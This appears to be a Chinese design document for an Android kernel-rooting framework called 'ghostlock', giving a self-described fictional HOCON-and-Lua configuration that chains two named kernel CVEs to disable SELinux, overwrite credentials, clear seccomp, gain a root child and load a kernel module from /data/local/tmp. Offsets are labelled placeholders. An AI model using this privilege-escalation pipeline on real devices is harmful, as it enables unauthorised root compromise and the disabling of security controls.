# 全流程攻击配置 · 虚拟示例（Lua 计划 + HOCON 数据）

> **虚拟示例**（不是任何真实机型的数据）：几何/偏移/调参都是编造的占位值，只为让你看清**形态与流程**。
> 依据设计：[lua-surface-design](lua-surface-design.md)（暴露面 6 条）· [A6-baseline-approval](../plan/A6-baseline-approval.md)。

## §1 整份 profile（一个资产档的样子）

```hocon
ghostlock {
  schema_version = 3
  release = "6.1.138-android14-11-gEXAMPLExxxxxx"      # 虚拟 uname -r
  kernel_major = 6
  kernel_minor = 1

  # 选择面：有序菜单，每项 = description + 计划脚本（脚本是 HOCON 字符串值）
  available = [
    {
      description = "43499 tcp_zerocopy：W1/W2/W3 -> root_child -> 载入模块"
      plan = [==[
        -- (1) 这一段在 root 之前跑一次（stage）：只声明，不执行
        local b = backend("cve_2026_43499")          -- 句柄（窗口外取得）

        b:writeop{ target = "selinux_enforcing", value = 0, width = 4 }   -- W1（参数集已考古定稿）
        -- 结构复制（考古新增的第二形态）：宽度 = profile 声明的结构尺寸
        b:copyop{  src = "cred_template",      dst = "cred_target", width = cfg.sizes.cred }  -- W2
        b:writeop{ target = "seccomp_mode",     value = 0, width = 8 }   -- W3

        -- 自由循环/条件（值来自数据面，不写死）
        local r = cfg.backend.cve_2026_43499.execution.race
        for i = 1, r.w3_attempts do
          if gl.sym("seccomp_mode") ~= 0 then
            b:settle{ us = r.setup_settle_us }
          else
            break
          end
        end

        b:handoff{ terminal = "root_child" }        -- 交接给 terminal 相位
        -- 收尾脚本与 LKM 由 Kotlin 在 resolve 后准备并作为输入传入；磁盘 HOCON 不定义具体 handoff
      ]==]
    },
    {
      description = "43284 pagecache + UMH：模块加载 -> 命令下发"
      plan = [==[
        local p = backend("cve_2026_43284")
        p:writeop{ target = "pagecache_slot", value = 1, width = 8 }
        p:handoff{ terminal = "umh_forward" }

        -- 中途换路（方案 2：clean 句柄 + 重新 acquire）——route 只在 acquire 给，无「切换」动词
        close(p)                                        -- 释放旧句柄（generation 递增，旧句柄失效）
        local p2 = backend("cve_2026_43284", { route = "select_stack" })
        p2:writeop{ target = "pagecache_slot", value = 1, width = 8 }
        -- 收尾同上：由 Kotlin 在 resolve 后作为输入传入；本档不定义命令内容
      ]==]
    },
  ]

  # 数据面：纯数据（脚本用 cfg.* 读；C++ 不写死任何数值）
  backend.cve_2026_43499.abi {
    task_struct { prio = 132, pi_lock = 2340, pi_waiters = 2360, cred = 2104, comm = 2120 }
    offset { init_task = 33486336, init_cred = 33561192, selinux_enforcing = 35820496 }
  }
  backend.cve_2026_43499.execution.race {
    setup_settle_us = 50000, w3_attempts = 3, route_wait_ms = 1000
  }
  lkm  { path = "/data/local/tmp/ghostlock.ko", mode = "default" }
  tmp  { ko_path = "/data/local/tmp/ghostlock.ko" }
  paths { diag = "/data/local/tmp/ghostlock-diag.txt" }
}
```

> 注：脚本包裹用 `[==[ ... ]==]`（Lua 长括号字符串，HOCON 侧作为普通字符串值），避免与脚本内部的引号/方括号冲突。

## §2 这套配置在执行时，谁在干什么（时间线）

| # | 阶段 | 执行者 | 发生什么 | 校验/判据 |
|---|---|---|---|---|
| 1 | 解析与选择 | Kotlin | 读 HOCON → 菜单（description 供 UI）→ 用户选第 1 项 | description 非空 · 脚本大小/sha256 |
| 2 | **stage**（root 前、窗口外） | **Lua 沙箱** | 脚本跑**一次**：backend(...) 取句柄 → writeop/settle/handoff 被**冻结成 staged 计划**；for/if 与 cfg.* 在此刻求值 | 逐调用边界校验（未知名字 ⇒ surface-unknown-name；argv 与 shell 违规 ⇒ run-form-invalid；参数越界 ⇒ param-invalid） |
| 3 | gate | C++ | 对 **staged 计划**（不是脚本）做十条校验 | 顺序/依赖/可用性/几何/窗口禁项 |
| 4 | **窗口**（PI 竞争） | C++ | writeop（属窗口相位）**原子执行**；**窗口内零 Lua** | 窗口禁项扫描 · 逐退出路径回收 |
| 5 | handoff | C++ | 交接给 terminal（root_child） | **收尾内容由 Kotlin 在 resolve 后作为输入传入**（HOCON 不定义具体命令） |
| 6 | **terminal 相位**（root 后） | **C++ terminal 层** | 按 on_success / always / on_failure 执行 staged 的 run 条目：argv → execv；sh -c 就是一条普通 argv | 每条记 argv/命令串/exit/耗时 进日志 |
| 7 | 内核兜底 | **C++** | 恢复 relay/enforce、watchdog | 不经 Lua |

## §3 三个一眼看懂的设计点

1. **脚本只在 root 前跑一次**：第 4/6 步里**没有任何 Lua**（writeop 与 run 都是 C++ 按冻结条目执行）。
2. **数值不落在 C++**：50000 us、w3_attempts=3、/data/local/tmp/ghostlock.ko、偏移量**全在数据面**，脚本用 cfg.* 读；改配置 = 改 HOCON，不改代码。
3. **收尾是声明式**：on_success/always/on_failure 三个块 = 旧 root_cmd 模板 + always + 内核兜底 的取代物；**内核兜底仍在 C++**（脚本异常也不影响它）。

## §4 本例用到的暴露面（与表一一对应）

| 用到的条目 | 出现处 | 相位 |
|---|---|---|
| backend("cve_2026_43499") | 脚本首行 | 窗口外（取句柄） |
| b:writeop{ target, value, width } | W1/W2/W3 与 43284 的写入 | **窗口相位** |
| b:settle{ us } | W3 重试循环内 | **窗口相位** |
| b:handoff{ terminal, payload_ref } | 交接（**引用语义**：只声明 terminal + payload 引用） | 窗口外 |
| cfg.backend... / cfg.lkm.path | 各处取数 | stage 期只读快照 |
| ~~run{ argv = {...} }~~（**待裁定移除**） | 收尾（若保留） | **terminal 相位（root 后）** |
| gl.sym("seccomp_mode") | 条件判断 | stage 期（预置工具函数） |

## §5 待确认两处（影响本示例的最终写法）

1. **`run` 是否整体移除**（**Lead 倾向移除**）：若移除，收尾部分改由 Kotlin 在 resolve 后生成并随 payload 传入，脚本内不再出现 `run`。
2. **handoff payload 的承载**：**wire `bin` + sha256** 还是会话帧？（影响 payload 如何送进 native 与校验点。）
